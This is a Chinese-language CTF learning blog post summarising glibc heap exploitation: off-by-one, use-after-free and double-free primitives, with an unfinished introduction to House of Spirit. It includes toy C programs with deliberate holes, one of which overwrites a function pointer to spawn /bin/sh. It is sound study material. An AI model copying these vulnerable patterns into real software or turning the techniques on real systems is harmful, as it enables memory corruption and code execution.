<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="google-site-verification" content="CXc5oa8hp0JI3nqiGKAoIQDPqSR7lhLCgNr11-7-XAA" />
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Ld1ng">



    <meta name="description" content="Ld1ng's Blog">


    <meta name="keywords" content="CTF,code,CUMT">


<title>堆溢出漏洞利用总结 | Ld1ng</title>



    <link rel="icon" href="/favicon.ico">



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    
    <link rel="stylesheet" href="/fonts/font_oytys7w58zn/iconfont.css">
    
    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    
    <script src="/js/jquery-3.7.0.min.js"></script>
    




    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<!-- 搜索的部分 -->



    <script>
    // function searchToggle() {
    //     const width = $(document.body).width()
    //     if(width > 479) {
    //         return;
    //     }
    //     const search = $('.search');
    //     const searchForm = $('.form-search')

    //     if(!search.hasClass("mobile-search")) {
    //         search.addClass("mobile-search");
    //     } else {
    //         search.removeClass("mobile-search");
    //     } 
    // }

    function searchToggle() {
        const width = $(document.body).width()
        if(width > 479) {
            return;
        }
        const search = $('.search');
        const searchForm = $('.form-search');
        const menuToggle = $('.menu-toggle');
        const title = $('.navbar-header-title ');

        if(!search.hasClass("mobile-search")) {
            search.addClass("mobile-search");
            menuToggle.addClass("open-search")
            title.addClass("mobile-title-hidden")
        } else {
            search.removeClass("mobile-search");
            menuToggle.removeClass("open-search")
            // title.css({visibility: 'visible'})
            title.removeClass("mobile-title-hidden")
        } 
    }



    function search(searchInputEl, formEl, flag) {
        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
        $(formEl).submit(function(e){
            e.preventDefault();
            let target = null
            if(searchInputEl == null) {
                const screenWidth = $(document.body).width();
                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
                console.log(target);
            } else {
                target = $(searchInputEl)
            }

            if(!flag && target.val() === '') {
                return ;
            }

            $("#u-search").fadeIn(500, function() {
                $("body > .wrapper").addClass("modal-active");

                $.ajax({
                    url: path,
                    dataType: "json",
                    beforeSend: function (xhr) {
                        $input = target.val();
                        $(".form-input").val($input);
                        const loadingBar = $('.search-loading-bar') 
                        loadingBar.css({
                            width:'100%',
                            display: 'block'
                        });
                    },
                    success: function( datas ) {
                        console.log(datas);
                        const $resultPanel = $(".modal-body")[0];
                        let str = `<ul class="modal-results">`;
                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
                        $resultPanel.innerHTML = "";
                        let hasResult = false
                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;

                        if ($(".form-input").val().trim().length <= 0) {
                            // 没有结果
                            $resultPanel.innerHTML = text;
                            return;
                        }
                        datas.forEach(function (data, index) {
                            var isMatch = true;
                            if (!data.title || data.title.trim() === '') {
                                data.title = "Untitled";
                            }
                            var data_title = data.title.trim().toLowerCase();
                            var data_content = data.content && data.content.trim().replace(/<[^>]+>/g, "").toLowerCase() || '';
                            var data_url = data.url;
                            var index_title = -1;
                            var index_content = -1;
                            var first_occur = -1;
                            // only match artiles with not empty contents
                            if (data_content !== '') {
                                keywords.forEach(function (keyword, i) {
                                    index_title = data_title.indexOf(keyword);
                                    index_content = data_content.indexOf(keyword);

                                    if (index_title < 0 && index_content < 0) {
                                        isMatch = false;
                                    } else {
                                        hasResult = true
                                        if (index_content < 0) {
                                            index_content = 0;
                                        }
                                        if (i == 0) {
                                            first_occur = index_content;
                                        }
                                    }
                                });
                            } else {
                                isMatch = false;
                            }
                            // show search results
                            if (isMatch) {
                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
                                var content = data.content.trim().replace(/<[^>]+>/g, "");
                                if (first_occur >= 0) {
                                    // cut out 200 characters
                                    var start = first_occur - 40;
                                    var end = first_occur + 160;

                                    if (start < 0) {
                                        start = 0;
                                    }

                                    if (start == 0) {
                                        end = 200;
                                    }

                                    if (end > content.length) {
                                        end = content.length;
                                    }

                                    var match_content = content.substring(start, end);

                                    // highlight all keywords
                                    keywords.forEach(function (keyword) {
                                        var regS = new RegExp(keyword, "gi");
                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
                                    });

                                    str += `<span class="content"> ${match_content} ...</span></a>`;
                                }
                                str += "</li>";
                            }
                        });
                        str += "</ul>";
                        if(hasResult) {
                            $resultPanel.innerHTML = str;
                        } else {
                            $resultPanel.innerHTML = text;
                        }

                    },
                    complete: function() {
                        setTimeout(() => {
                                const loadingBar = $('.search-loading-bar') 
                                loadingBar.css({
                                    width:'0%',
                                    display: 'none'
                                });
                        }, 300)
                    }
                });
            })

        });
    }

    $(document).ready(function() {
        $('.modal-close').click(function () { 
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })

        $('.modal-overlay').click(function() {
            $("#u-search").fadeOut();
            $("body > .wrapper").removeClass("modal-active")
        })
        search(null, ".form-search", false)
        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
    })
</script>

<meta name="generator" content="Hexo 6.0.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-home1"></i> Home</a></div>
            <div class="menu navbar-right">
                <!-- 这里表示的是pc端搜索框 -->
				
				
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="Searching" autocomplete="off" id="pc-search-input"/>
        </form>
    </div>

				
				
				  
				  
				  <a class="menu-item" href="/archives">
					<i class="iconfont icon-navicon-wzgl"></i>
					Posts
				  </a>
				
				  
				  
				  <a class="menu-item" href="/categories">
					<i class="iconfont icon-fenlei"></i>
					Categories
				  </a>
				
				  
				  
				  <a class="menu-item" href="/tags">
					<i class="iconfont icon-tag1"></i>
					Tags
				  </a>
				
				  
				  
				  <a class="menu-item" href="/links">
					<i class="iconfont icon-link1"></i>
					Links
				  </a>
				
				  
				  
				  <a class="menu-item" href="/about">
					<i class="iconfont icon-diandengpao"></i>
					About
				  </a>
				
				<input id="switch_default" type="checkbox" class="switch_default">
				<label for="switch_default" class="toggleBtn"></label>
        </div>
    </div>
</nav>

    
<nav class="navbar-mobile" id="nav-mobile">
    <div class="container">
        <div class="navbar-header">
            <div>
                <a href="/">Home</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
            </div>
            <div class="navbar-mobile-right">
                
                
    <div class="search ">
        <div class="search-btn" onClick="searchToggle()">
            <img src="/image/search.png" class="search-btn-img" />
        </div>
        <form class="form-search">
            <input class="input" placeholder="Searching" autocomplete="off" id="mobile-search-input"/>
        </form>
    </div>

                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
            </div>

        </div>
        <div class="menu" id="mobile-menu">
            
            <a class="menu-item" href="/archives">Posts</a>
            
            <a class="menu-item" href="/categories">Categories</a>
            
            <a class="menu-item" href="/tags">Tags</a>
            
            <a class="menu-item" href="/links">Links</a>
            
            <a class="menu-item" href="/about">About</a>
            
        </div>
    </div>
</nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">堆溢出漏洞利用总结</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Ld1ng</a>
                    
					&nbsp;
                    
                        <span class="post-time">
                        Date: <a href="#">August 6, 2020</a>
                        </span>
                    
					&nbsp;
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/LEARNING/">LEARNING</a>
                            
                        </span>
                    
					<br>
                     
    <span class="post-count">
Words:
    <a href="">10.1k</a>  
    </span>

&nbsp;

    <span class="post-count">
Time:
    <a href="">43min</a>  
    </span>

&nbsp;
<span id="busuanzi_container_page_pv">
  Views: <a href=""><span id="busuanzi_value_page_pv"></a></span></a>  
</span>
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>历时三天的速成，终于把报告上交了；</p>
<p>不过话说回来，堆可能是初学者比较难啃的骨头，没什么固定做法，复杂多变；</p>
<p>这里自己记录一些最基本的知识点</p>
<hr>
<p>后期往里补充一点知识点</p>
<h1 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h1><p>堆(heap)是一种全局的数据结构，主要是指用户动态申请的内存(如调用malloc、alloc、new等函数)，不同于栈的是，堆具有更多的灵活性，因此堆漏洞的利用也更加复杂，更加零散，在此我总结一下堆溢出漏洞的几种常见的利用方法。</p>
<p>以下是学习堆所需要掌握并熟悉的基本知识点。</p>
<ol>
<li><p>glibc malloc中三种最基本的堆块数据结构：heap_info, malloc_state, malloc_chunk;</p>
</li>
<li><p>chunk内存块结构及各字段功能;</p>
</li>
<li><p>bins类型及空闲内存块的管理组织方法;</p>
</li>
<li><p>malloc()、free()工作流程；</p>
</li>
</ol>
<h1 id="0x02-基本漏洞类型"><a href="#0x02-基本漏洞类型" class="headerlink" title="0x02 基本漏洞类型"></a>0x02 基本漏洞类型</h1><h3 id="1-常规堆溢出"><a href="#1-常规堆溢出" class="headerlink" title="1.常规堆溢出"></a>1.常规堆溢出</h3><p>堆缓冲区溢出与栈缓冲区溢出类似，指堆上的缓冲区被填入过多数据，导致堆中其他数据被覆盖，主要分为两种情况：</p>
<p>(1)覆盖本堆块内部数据，通常发生在结构体中，如果结构体中数组溢出，则覆盖后续变量。</p>
<p>(2)覆盖后续堆块数据，会影响后续堆块的数据，甚至破坏堆块结构。</p>
<p>对于这两种情况可以类比栈溢出原理，没有太多技巧性的知识，但是CTF中不会出现单纯利用堆溢出的题目，通常多种基本漏洞会相互结合，所以要求常见基本漏洞类型都要掌握并且能够灵活使用。</p>
<hr>
<h3 id="2-Off-By-One"><a href="#2-Off-By-One" class="headerlink" title="2.Off By One"></a>2.Off By One</h3><p>缓冲区溢出的一种，但是比较特殊，只能溢出1个字节。</p>
<p>有两种利用思路：</p>
<p>(1)  溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。</p>
<p>(2)  溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。</p>
<p>下面是一个简单的off by one的程序：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>程序很简单，但并非安全，问题在于strlen 在计算长度的时候不会把结束符 ‘\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\x00’ 也算上，所以就会造成 off by one。(for循环中也比较常见)</p>
<p>调试一下，便于理解，在main函数下断点，然后单步到输入位置，查看一下chunk情况，</p>
<p><img src="https://i.loli.net/2020/07/23/1EsYTkOrwICQqng.png"></p>
<p>当我们输入24个’A’之后，很明显下一位低字节被覆盖为’\x00’</p>
<p><img src="https://i.loli.net/2020/07/23/qaxSFDMzu9iPpkT.png"></p>
<p>Note：有一个点要注意，为什么申请了24个字节，chunk大小是0x21呢，也就是说为什么用户数据部分大小只有0x10?</p>
<p>其实是这样的，当前一堆块正在使用时，下一堆块的prev_size也被当作数据部分(大小0x08)，只有前一堆块free时，prev_size域才有意义。</p>
<hr>
<h3 id="3-Use-After-Free"><a href="#3-Use-After-Free" class="headerlink" title="3.Use After Free"></a>3.Use After Free</h3><p>Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。通常需要根据具体情况分析，以判断是否具有信息泄露和信息修改的功能。</p>
<p>这是比赛时最常规的一种方法，绝大多数题目都要借助它来完成，简单来说当我们第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。</p>
<p>同样，用一个 UAF的程序展示简单的漏洞利用，以便于理解。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*func_ptr)</span><span class="params">(<span class="keyword">char</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys1</span><span class="params">(<span class="keyword">char</span> command[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">system(command);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">char</span> content[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,content);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    func_ptr *p1=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));<span class="comment">//申请了4个int大小的内存</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//因为前2个也就是0x10是用来管理chunk的</span></span><br><span class="line">    p1[<span class="number">2</span>]=echo;<span class="comment">//所以从第三个开始</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello world\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">//在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"hello again\n"</span>); <span class="comment">//p1指针未被置空,虽然free了,但仍可使用.</span></span><br><span class="line">    func_ptr *p2=(func_ptr*)<span class="built_in">malloc</span>(<span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    <span class="comment">//free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc addr: %p\n"</span>,p1);<span class="comment">//p2与p1指针指向的内存为同一地址</span></span><br><span class="line">    p2[<span class="number">2</span>]=sys1; <span class="comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.</span></span><br><span class="line">    p1[<span class="number">2</span>](<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>很明显，p1,p2指针指向了同一地址，原因就是p1被释放后，放入fastbin，当p2再次申请同样大小的空间时，直接从fastbin中取出刚刚被释放、且大小合适的内存空间（即p1），以提高分配速度，如果程序员粗心大意，那么就会造成了可以被利用的UAF漏洞。</p>
<p><img src="https://i.loli.net/2020/07/23/9iB4mYRT1dDb7tA.png"></p>
<p>成功获取shell。</p>
<hr>
<h3 id="4-Double-Free"><a href="#4-Double-Free" class="headerlink" title="4.Double Free"></a>4.Double Free</h3><p>Double Free是UAF较为特殊的一种，也是比赛中经常被使用的基本方法之一，简单的说，double free是任意地址写的一种技巧，要与堆管理的其他特性相结合使用，先不谈利用，这里我只是介绍一下double free最基础的原理。以fastbin为例，fastbin 是 LIFO 的数据结构，使用单向链表实现。根据fastbin 的特性，释放的chunk 会以单向链表的形式回收到fastbin 里面，然后通过 fastbin-&gt;fd 来遍历。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过了检查顺利执行，然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(d, <span class="string">"DDDDDDDD"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4st malloc(9) %p points to %s the first time\n"</span>, d, d);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s the second time\n"</span>, f, f);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>程序free(a)了两次，可以一步一步调试chunk的情况，</p>
<p>三次malloc之后</p>
<p><img src="https://i.loli.net/2020/07/23/M9V4kXQqRULDdnA.png"></p>
<p>free(a)之后，可以看到a被加到了fastbin中</p>
<p><img src="https://i.loli.net/2020/07/23/7InVkBHpStOg4Nz.png"></p>
<p><img src="https://i.loli.net/2020/07/23/EYlCgqmK4Qud8FX.png"></p>
<p>free(b)之后,可以看到b也被加到fastbin中，并且fd指针指向了a的地址</p>
<p><img src="https://i.loli.net/2020/07/23/XMowxTDZ7PsiAq3.png"></p>
<p><img src="https://i.loli.net/2020/07/23/P6e2dSHTAkmLpvX.png"></p>
<p>再次free(a)之后，a-&gt;fd又指向了b，也就是说a再一次被添加到fastbin，同时b-&gt;fd=a，所以实际上形成了一个环。</p>
<p><img src="https://i.loli.net/2020/07/23/gErzHZUPC8Kt5nY.png"></p>
<p>最后三次malloc之后,发现0x44(‘D’)不见了，其实是第二次malloc a的时候0x46将其覆盖了。这就是double free的基本原理，但可以想象，如果第一次申请a的时候，将fd指针修改成有意义的地址，那么我们就可以做到任意地址写(可以结合堆溢出)。</p>
<p><img src="https://i.loli.net/2020/07/23/PIeNXDMBSHuAEaw.png"></p>
<p>在 libc-2.26 之后，即使两次 free，也没有触发 double-free 的异常检测，这是因为 tcache 的机制有关，水平有限，这里暂不探讨。</p>
<hr>
<h1 id="0x03-堆溢出漏洞利用"><a href="#0x03-堆溢出漏洞利用" class="headerlink" title="0x03 堆溢出漏洞利用"></a>0x03 堆溢出漏洞利用</h1><h3 id="1-House-of-spirit-fastbin"><a href="#1-House-of-spirit-fastbin" class="headerlink" title="1. House of spirit(fastbin)"></a>1. House of spirit(fastbin)</h3><p><strong>利用技术:</strong></p>
<blockquote>
<p>(1) fastbin 为单链表(只用到fd)，结构简单，容易伪造<br>(2) 为了提高分配效率，安全检查少<br>(3) 只针对fastbin大小的chunk，small/large chunk不适用<br>(4) 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</p>
</blockquote>
<p><strong>利用思路:</strong></p>
<ol>
<li><p>空闲fast chunk如果发生溢出被覆盖，则链表指针fd可以被修改</p>
</li>
<li><p>通过修改链表指针fd，在fastbin中引入伪造的free chunk(最重要的是必须保证伪造的chunk结构合法)</p>
</li>
<li><p>下次分配时分配伪造的fast chunk</p>
</li>
<li><p>伪造的fast chunk可以在以下位置：</p>
</li>
</ol>
<p>在栈上伪造fast chunk：覆盖返回地址<br>在bss上伪造fast chunk：修改全局变量<br>在堆上伪造fast chunk：修改堆上数据</p>
<p>以fastbin_dup_into_stack为例，该程序便是利用double free进行fastbin attack其余两种可类比该例子</p>
